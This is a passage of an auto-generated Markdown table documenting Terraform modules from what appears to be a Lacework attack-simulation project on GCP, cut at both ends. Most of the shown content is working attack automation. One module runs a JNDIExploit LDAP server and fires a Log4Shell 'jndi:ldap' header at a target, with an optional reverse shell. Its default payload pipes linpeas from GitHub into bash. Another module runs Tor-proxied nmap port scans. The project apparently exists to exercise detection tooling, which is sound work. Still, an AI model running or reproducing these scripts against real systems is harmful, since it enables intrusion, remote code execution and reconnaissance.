                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| target-osconfig-execute-generate-web-traffic            | ./modules/osconfig/execute-generate-web-traffic       | osconfig_exec_generate_web_traffic_target       | context.gcp.osconfig.target.execute.generate_web_traffic         | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "target": {<br/>                    "execute": {<br/>                        "generate_web_traffic": {<br/>                            "delay": 60,<br/>                            "enabled": false,<br/>                            "urls": []<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-generate-web-traffic       | <pre>locals &&#35;123;<br/>    attack&&#35;95;dir = &quot;/generate&#45;web&#45;traffic&quot;<br/>    curl&&#35;95;urls = join&&#35;40;&quot;&&#35;92;n&quot;, &&#35;91; for url in var&#46;inputs&&#35;91;&quot;urls&quot;&&#35;93;: &quot;curl &#45;s &#45;&#45;retry 20 &#45;&#45;retry&#45;connrefused &#45;&#45;retry&#45;delay 60 &#45;&#45;connect&#45;timeout 5 &&#35;x27;$&&#35;123;url&&#35;125;&&#35;x27;; log &&#35;92;&quot;curl $&&#35;123;url&&#35;125; result: $?&&#35;92;&quot;&quot; &&#35;93;&&#35;41;<br/>    payload = &lt;&lt;&#45;EOT<br/>    rm &#45;rf $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    mkdir &#45;p $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    cd $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    log &quot;Enumerating urls&#46;&#46;&#46;&quot;<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;Running url enumeration:&&#35;92;n$&&#35;123;local&#46;curl&&#35;95;urls&&#35;125;&quot;<br/>        $&&#35;123;local&#46;curl&&#35;95;urls&&#35;125;<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/>    <br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;curl&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;curl&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| attacker-osconfig-execute-docker-exploit-log4j          | ./modules/osconfig/execute-docker-exploit-log4j       | osconfig_exec_docker_exploit_log4j_app          | context.gcp.osconfig.attacker.execute.docker_exploit_log4j_app   | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "docker_exploit_log4j_app": {<br/>                            "attack_delay": 50400,<br/>                            "attacker_http_port": 8088,<br/>                            "attacker_ip": null,<br/>                            "attacker_ldap_port": 1389,<br/>                            "enabled": false,<br/>                            "payload": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files",<br/>                            "reverse_shell": false,<br/>                            "reverse_shell_port": 0,<br/>                            "target_ip": null,<br/>                            "target_port": null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                     | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-exploit-log4j       | <pre>locals &&#35;123;<br/>    attack&&#35;95;dir = &quot;/jndiexploit&quot;<br/>    attack&&#35;95;script = &quot;jndiexploit&#46;sh&quot;<br/>    start&&#35;95;script = &quot;delayed&&#35;95;start&#46;sh&quot;<br/>    lock&&#35;95;file = &quot;/tmp/delay&&#35;95;log4shell&#46;lock&quot;<br/>    jndiexploit&&#35;95;url=&quot;https://github&#46;com/credibleforce/jndi/raw/main/jndi&#46;base64&quot;<br/>    image = &quot;openjdk:11&quot;<br/>    name = &quot;jndiexploit&quot;<br/>    exec&&#35;95;type = var&#46;inputs&&#35;91;&quot;reverse&&#35;95;shell&quot;&&#35;93; == true ? &quot;ReverseShell&quot; : &quot;Basic/Command/Base64&quot;<br/><br/>    &#35; only base64 encode the payload if we are executing a command<br/>    base64&&#35;95;log4shell&&#35;95;payload= urlencode&&#35;40;var&#46;inputs&&#35;91;&quot;reverse&&#35;95;shell&quot;&&#35;93; == true ? var&#46;inputs&&#35;91;&quot;payload&quot;&&#35;93; : base64encode&&#35;40;<br/>       replace&&#35;40;replace&&#35;40;var&#46;inputs&&#35;91;&quot;payload&quot;&&#35;93;, &quot;$ATTACKER&&#35;95;IP&quot;, var&#46;inputs&&#35;91;&quot;attacker&&#35;95;ip&quot;&&#35;93;&&#35;41;, &quot;$REVERSE&&#35;95;SHELL&&#35;95;PORT&quot;, var&#46;inputs&&#35;91;&quot;reverse&&#35;95;shell&&#35;95;port&quot;&&#35;93;&&#35;41;<br/>    &&#35;41;&&#35;41;<br/>    payload = &lt;&lt;&#45;EOT<br/>    log &quot;removing previous app directory&quot;<br/>    docker stop $&&#35;123;local&#46;name&&#35;125;<br/>    rm &#45;rf $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    log &quot;creating app directory&quot;<br/>    mkdir &#45;p $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    cd $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    <br/>    log &quot;starting script&#46;&#46;&#46;&quot;<br/>    JNDIEXPLOIT&&#35;95;URL=&quot;$&&#35;123;local&#46;jndiexploit&&#35;95;url&&#35;125;&quot;<br/>    NAME=&quot;$&&#35;123;local&#46;name&&#35;125;&quot;<br/>    IMAGE=&quot;$&&#35;123;local&#46;image&&#35;125;&quot;<br/>    ATTACKER&&#35;95;IP=&quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;attacker&&#35;95;ip&quot;&&#35;93;&&#35;125;&quot;<br/>    ATTACKER&&#35;95;HTTP&&#35;95;PORT=$&&#35;123;var&#46;inputs&&#35;91;&quot;attacker&&#35;95;http&&#35;95;port&quot;&&#35;93;&&#35;125;<br/>    ATTACKER&&#35;95;LDAP&&#35;95;PORT=$&&#35;123;var&#46;inputs&&#35;91;&quot;attacker&&#35;95;ldap&&#35;95;port&quot;&&#35;93;&&#35;125;<br/>    TARGET&&#35;95;IP=$&&#35;123;var&#46;inputs&&#35;91;&quot;target&&#35;95;ip&quot;&&#35;93;&&#35;125;<br/>    TARGET&&#35;95;PORT=$&&#35;123;var&#46;inputs&&#35;91;&quot;target&&#35;95;port&quot;&&#35;93;&&#35;125;<br/>    EXEC&&#35;95;TYPE=&quot;$&&#35;123;local&#46;exec&&#35;95;type&&#35;125;&quot;<br/>    REVERSE&&#35;95;SHELL&&#35;95;PORT=&quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;reverse&&#35;95;shell&&#35;95;port&quot;&&#35;93;&&#35;125;&quot;<br/>    BASE64&&#35;95;PAYLOAD=&quot;$&&#35;123;local&#46;base64&&#35;95;log4shell&&#35;95;payload&&#35;125;&quot;<br/>    PUBLIC&&#35;95;IP=$&&#35;40;curl &#45;s https://icanhazip&#46;com&&#35;41;<br/>    TIMEOUT=1800<br/>    START&&#35;95;TIME=$&&#35;40;date &#43;%s&&#35;41;<br/>    &#35; Check if $ATTACKER&&#35;95;IP is an IP address<br/>    if &&#35;91;&&#35;91; $ATTACKER&&#35;95;IP =~ ^&&#35;91;0&#45;9&&#35;93;&#43;&&#35;92;&#46;&&#35;91;0&#45;9&&#35;93;&#43;&&#35;92;&#46;&&#35;91;0&#45;9&&#35;93;&#43;&&#35;92;&#46;&&#35;91;0&#45;9&&#35;93;&#43;$ &&#35;93;&&#35;93;; then<br/>        log &quot;server is set to IP address $ATTACKER&&#35;95;IP, no need to resolve DNS&quot;<br/>    else<br/>        log &quot;checking dns resolution: $ATTACKER&&#35;95;IP&quot;<br/>        while true; do<br/>            IP=$&&#35;40;dig &#43;short $ATTACKER&&#35;95;IP&&#35;41;<br/>            if &&#35;91; &#45;z &quot;$IP&quot; &&#35;93;; then  &#35; If $IP is empty, the domain hasn&&#35;x27;t resolved yet<br/>                CURRENT&&#35;95;TIME=$&&#35;40;date &#43;%s&&#35;41;<br/>                ELAPSED&&#35;95;TIME=$&&#35;40;&&#35;40;CURRENT&&#35;95;TIME &#45; START&&#35;95;TIME&&#35;41;&&#35;41;<br/>                if &&#35;91; $ELAPSED&&#35;95;TIME &#45;gt $TIMEOUT &&#35;93;; then<br/>                    log &quot;DNS resolution for $ATTACKER&&#35;95;IP timed out after $TIMEOUT seconds&quot;<br/>                    exit 1<br/>                fi<br/>                sleep 10<br/>            else<br/>                log &quot;Current public ip: $PUBLIC&&#35;95;IP&quot;<br/>                log &quot;$ATTACKER&&#35;95;IP resolved to $IP&quot;<br/>                if &&#35;91; &quot;$IP&quot; == &quot;$PUBLIC&&#35;95;IP&quot; &&#35;93;; then<br/>                    log &quot;Resolution matches public ip: $IP == $PUBLIC&&#35;95;IP&quot;<br/>                    break<br/>                else<br/>                    log &quot;Resolution of dns does not match: $IP &#33;= $PUBLIC&&#35;95;IP&quot;<br/>                    sleep 10<br/>                fi<br/>            fi<br/>        done<br/>    fi<br/><br/>    if &&#35;91;&&#35;91; &#33; &#45;f &quot;jndi&#46;base64&quot; &#124;&#124; &#33; &#45;f &quot;JNDIExploit&#45;1&#46;2&#45;SNAPSHOT&#46;jar&quot; &&#35;93;&&#35;93;; then<br/>        rm &#45;f jndi&#46;base64 &&#35;42;&#46;zip JNDIExploit&#45;&&#35;42;&#46;jar<br/>        wget https://github&#46;com/credibleforce/jndi/raw/main/jndi&#46;base64<br/>        base64 &#45;d jndi&#46;base64 &gt; JNDIExploit&#46;1&#46;2&#46;zip<br/>        unzip &#45;o JNDIExploit&#46;&&#35;42;&#46;zip<br/>        rm &&#35;42;&#46;zip<br/>    fi<br/><br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;setting up jndiexploit in screen session&#46;&#46;&#46;&quot;<br/>        if pgrep &#45;f &quot;JNDIExploit&quot;; then<br/>            kill &#45;9 $&&#35;40;pgrep &#45;f &quot;JNDIExploit&quot;&&#35;41;<br/>        fi<br/>        JNDIEXPLOIT&&#35;95;LOG=&quot;/tmp/jndiexploit&#46;log&quot;<br/>        for i in &&#35;96;seq $&&#35;40;&&#35;40;MAXLOG&#45;1&&#35;41;&&#35;41; &#45;1 1&&#35;96;; do mv &quot;$JNDIEXPLOIT&&#35;95;LOG&#46;&quot;&&#35;123;$i,$&&#35;40;&&#35;40;i&#43;1&&#35;41;&&#35;41;&&#35;125; 2&gt;/dev/null &#124;&#124; true; done<br/>        mv $JNDIEXPLOIT&&#35;95;LOG &quot;$JNDIEXPLOIT&&#35;95;LOG&#46;1&quot; 2&gt;/dev/null &#124;&#124; true<br/>        screen &#45;S jndiexploit &#45;X quit<br/>        screen &#45;wipe<br/>        screen &#45;d &#45;L &#45;Logfile $JNDIEXPLOIT&&#35;95;LOG &#45;S jndiexploit &#45;m java &#45;jar JNDIExploit&#45;&&#35;42;&#46;jar &#45;&#45;ip $ATTACKER&&#35;95;IP &#45;&#45;httpPort 8088 &#45;&#45;ldapPort 1389<br/>        screen &#45;S jndiexploit &#45;X colon &quot;logfile flush 0^M&quot;<br/><br/>        log &quot;sleeping 15 minutes&#46;&#46;&#46;&quot;<br/>        sleep 900<br/>        log &quot;start services availability check&#46;&#46;&#46;&quot;<br/><br/>        log &quot;checking target: $TARGET&&#35;95;IP:$TARGET&&#35;95;PORT&quot;<br/>        while &#33; nc &#45;z &#45;w 5 &#45;vv $TARGET&&#35;95;IP $TARGET&&#35;95;PORT &gt; /dev/null; do<br/>            log &quot;failed check &#45; waiting for target: $TARGET&&#35;95;IP:$TARGET&&#35;95;PORT&quot;;<br/>            sleep 30;<br/>            if &#33; screen &#45;ls &#124; grep jndiexploit; then<br/>                log &quot;screen session no longer running&#46;&#46;&#46;reset required&quot;<br/>                break<br/>            fi<br/>            if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>                log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>                rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>                break 2<br/>            fi<br/>        done;<br/>        if &#33; screen &#45;ls &#124; grep jndiexploit; then<br/>            log &quot;screen session no longer running&#46;&#46;&#46;reset required&quot;<br/>            break<br/>        fi<br/>        log &quot;target available&quot;;<br/>        log &quot;checking attacker ldap: $ATTACKER&&#35;95;IP:$ATTACKER&&#35;95;LDAP&&#35;95;PORT&quot;<br/>        while &#33; nc &#45;z &#45;w 5 &#45;vv $ATTACKER&&#35;95;IP $ATTACKER&&#35;95;LDAP&&#35;95;PORT &gt; /dev/null; do<br/>            log &quot;failed check &#45; waiting for attacker ldap: $ATTACKER&&#35;95;IP:$ATTACKER&&#35;95;LDAP&&#35;95;PORT&quot;;<br/>            sleep 30;<br/>            if &#33; screen &#45;ls &#124; grep jndiexploit; then<br/>                log &quot;screen session no longer running&#46;&#46;&#46;reset required&quot;<br/>                break<br/>            fi<br/>            if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>                log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>                rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>                break 2<br/>            fi<br/>        done;<br/>        if &#33; screen &#45;ls &#124; grep jndiexploit; then<br/>            log &quot;screen session no longer running&#46;&#46;&#46;reset required&quot;<br/>            break<br/>        fi<br/>        log &quot;attacker ldap available&quot;;<br/>        log &quot;checking attacker http: $ATTACKER&&#35;95;IP:$ATTACKER&&#35;95;HTTP&&#35;95;PORT&quot;<br/>        while &#33; nc &#45;z &#45;w 5 &#45;vv $ATTACKER&&#35;95;IP $ATTACKER&&#35;95;HTTP&&#35;95;PORT &gt; /dev/null; do<br/>            log &quot;failed check &#45; waiting for attacker http: $ATTACKER&&#35;95;IP:$ATTACKER&&#35;95;HTTP&&#35;95;PORT&quot;;<br/>            sleep 30;<br/>            if &#33; screen &#45;ls &#124; grep jndiexploit; then<br/>                log &quot;screen session no longer running&#46;&#46;&#46;reset required&quot;<br/>                <br/>            fi<br/>            if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>                log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>                rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>                break 2<br/>            fi<br/>        done;<br/>        if &#33; screen &#45;ls &#124; grep jndiexploit; then<br/>            log &quot;screen session no longer running&#46;&#46;&#46;reset required&quot;<br/>            break<br/>        fi<br/>        log &quot;attacker http available&quot;;<br/>        if &&#35;91; &quot;0&quot; &#33;= &quot;$REVERSE&&#35;95;SHELL&&#35;95;PORT&quot; &&#35;93;; then<br/>            log &quot;checking attacker reverse shell: $ATTACKER&&#35;95;IP:$REVERSE&&#35;95;SHELL&&#35;95;PORT&quot;<br/>            while &#33; nc &#45;z &#45;w 5 &#45;vv $ATTACKER&&#35;95;IP $REVERSE&&#35;95;SHELL&&#35;95;PORT &gt; /dev/null; do<br/>                log &quot;failed check &#45; waiting for attacker reverse shell: $ATTACKER&&#35;95;IP:$REVERSE&&#35;95;SHELL&&#35;95;PORT&quot;;<br/>                sleep 30;<br/>                if &#33; screen &#45;ls &#124; grep jndiexploit; then<br/>                    log &quot;screen session no longer running&#46;&#46;&#46;reset required&quot;<br/>                fi<br/>                if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>                    log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>                    rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>                    break 2<br/>                fi<br/>            done;<br/>            log &quot;attacker reverse shell available&quot;;<br/>        fi<br/>        sleep 30;<br/>        if &#33; screen &#45;ls &#124; grep jndiexploit; then<br/>            log &quot;screen session no longer running&#46;&#46;&#46;reset required&quot;<br/>            break<br/>        fi<br/>        log &quot;sending payload: curl &#45;&#45;verbose $TARGET&&#35;95;IP:$TARGET&&#35;95;PORT &#45;H &&#35;x27;X&#45;Api&#45;Version: &&#35;92;$$&&#35;123;jndi:ldap://$ATTACKER&&#35;95;IP:$ATTACKER&&#35;95;LDAP&&#35;95;PORT/$EXEC&&#35;95;TYPE/$BASE64&&#35;95;PAYLOAD&&#35;125;&&#35;x27;&quot;<br/>        /bin/bash &#45;c &quot;curl &#45;&#45;verbose $TARGET&&#35;95;IP:$TARGET&&#35;95;PORT &#45;H &&#35;x27;X&#45;Api&#45;Version: &&#35;92;$$&&#35;123;jndi:ldap://$ATTACKER&&#35;95;IP:$ATTACKER&&#35;95;LDAP&&#35;95;PORT/$EXEC&&#35;95;TYPE/$BASE64&&#35;95;PAYLOAD&&#35;125;&&#35;x27;&quot;<br/>        log &quot;done&quot;;<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;waiting $&&#35;123;var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;&&#35;125; seconds&#46;&#46;&#46;&quot;;<br/>            sleep $&&#35;123;var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;&&#35;125;<br/>        fi<br/>    done<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/><br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        apt&&#35;95;packages = &quot;git openjdk&#45;11&#45;jdk unzip&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        yum&&#35;95;packages = &quot;git java&#45;11&#45;openjdk java&#45;11&#45;openjdk&#45;devel unzip&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| attacker-osconfig-execute-docker-nmap                   | ./modules/osconfig/execute-docker-nmap                | osconfig_exec_docker_nmap_attacker              | context.gcp.osconfig.attacker.execute.docker_nmap                | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "docker_nmap": {<br/>                            "attack_delay": 50400,<br/>                            "enabled": false,<br/>                            "ports": [<br/>                                22,<br/>                                80,<br/>                                443,<br/>                                1433,<br/>                                3306,<br/>                                5000,<br/>                                5432,<br/>                                5900,<br/>                                6379,<br/>                                8000,<br/>                                8080,<br/>                                8088,<br/>                                8090,<br/>                                8091,<br/>                                9200,<br/>                                27017<br/>                            ],<br/>                            "scan_local_network": false,<br/>                            "targets": [],<br/>                            "use_tor": true<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre> | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-nmap                | <pre>locals &&#35;123;<br/>    attack&&#35;95;dir = &quot;/nmap&quot;<br/>    attack&&#35;95;script = &quot;nmap&#46;sh&quot;<br/>    start&&#35;95;script = &quot;delayed&&#35;95;start&#46;sh&quot;<br/>    lock&&#35;95;file = &quot;/tmp/delay&&#35;95;nmap&#46;lock&quot;<br/>    payload = &lt;&lt;&#45;EOT<br/>    log &quot;cleaning app directory&quot;<br/>    rm &#45;rf $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    mkdir &#45;p $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    cd $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;starting script&#46;&#46;&#46;&quot;<br/>        LOCAL&&#35;95;NET=$&&#35;40;ip &#45;o &#45;f inet addr show &#124; awk &&#35;x27;/scope global/ &&#35;123;print $4&&#35;125;&&#35;x27; &#124; head &#45;1&&#35;41;<br/>        log &quot;LOCAL&&#35;95;NET: $LOCAL&&#35;95;NET&quot;<br/>        log &quot;Targets: $&&#35;123;join&&#35;40;&quot;,&quot;, var&#46;inputs&&#35;91;&quot;targets&quot;&&#35;93;&&#35;41;&&#35;125;&quot;<br/>        echo &quot;$&&#35;123; length&&#35;40;var&#46;inputs&&#35;91;&quot;targets&quot;&&#35;93;&&#35;41; &gt; 0 ? join&&#35;40;&quot;&&#35;92;n&quot;, var&#46;inputs&&#35;91;&quot;targets&quot;&&#35;93;&&#35;41; : &quot;$LOCAL&&#35;95;NET&quot; &&#35;125;&quot; &gt; /tmp/nmap&#45;targets&#46;txt<br/>        log &quot;Ports: $&&#35;123;join&&#35;40;&quot;,&quot;, var&#46;inputs&&#35;91;&quot;ports&quot;&&#35;93;&&#35;41;&&#35;125;&quot;<br/>        if docker ps &#45;a &#124; grep $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125;; then <br/>            docker stop $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125;<br/>            docker rm $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125;<br/>        fi<br/>        $&&#35;123; var&#46;inputs&&#35;91;&quot;use&&#35;95;tor&quot;&&#35;93; == true ? &lt;&lt;&#45;EOF<br/>        log &quot;Using tor network&#46;&#46;&#46;&quot;<br/>        if &#33; docker ps &#124; grep torproxy &gt; /dev/null; then<br/>        docker run &#45;d &#45;&#45;rm &#45;&#45;name torproxy &#45;p 9050:9050 dperson/torproxy<br/>        fi<br/>        TORPROXY=$&&#35;40;docker inspect &#45;f &&#35;x27;&&#35;123;&&#35;123;range &#46;NetworkSettings&#46;Networks&&#35;125;&&#35;125;&&#35;123;&&#35;123;&#46;IPAddress&&#35;125;&&#35;125;&&#35;123;&&#35;123;end&&#35;125;&&#35;125;&&#35;x27; torproxy&&#35;41;<br/>        log &quot;Running via docker: proxychains nmap &#45;Pn &#45;sT &#45;T2 &#45;oX /tmp/scan&#46;xml &#45;p$&&#35;123;join&&#35;40;&quot;,&quot;, var&#46;inputs&&#35;91;&quot;ports&quot;&&#35;93;&&#35;41;&&#35;125; &#45;iL /tmp/nmap&#45;targets&#46;txt&quot;<br/>        /bin/bash &#45;c &quot;docker run &#45;v /tmp:/tmp &#45;e TORPROXY=$TORPROXY &#45;&#45;name $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125; $&&#35;123;var&#46;inputs&&#35;91;&quot;image&quot;&&#35;93;&&#35;125; nmap &#45;Pn &#45;sT &#45;T2 &#45;oX /tmp/scan&#46;xml &#45;p$&&#35;123;join&&#35;40;&quot;,&quot;, var&#46;inputs&&#35;91;&quot;ports&quot;&&#35;93;&&#35;41;&&#35;125; &#45;iL /tmp/nmap&#45;targets&#46;txt &#124;&#124; true&quot; <br/>        /bin/bash &#45;c &quot;docker logs $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1&quot;<br/>        /bin/bash &#45;c &quot;docker rm $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125;&quot;<br/>        EOF<br/>        : &lt;&lt;&#45;EOF<br/>        log &quot;Running via docker: nmap &#45;Pn &#45;sS &#45;T2 &#45;oX /tmp/scan&#46;xml 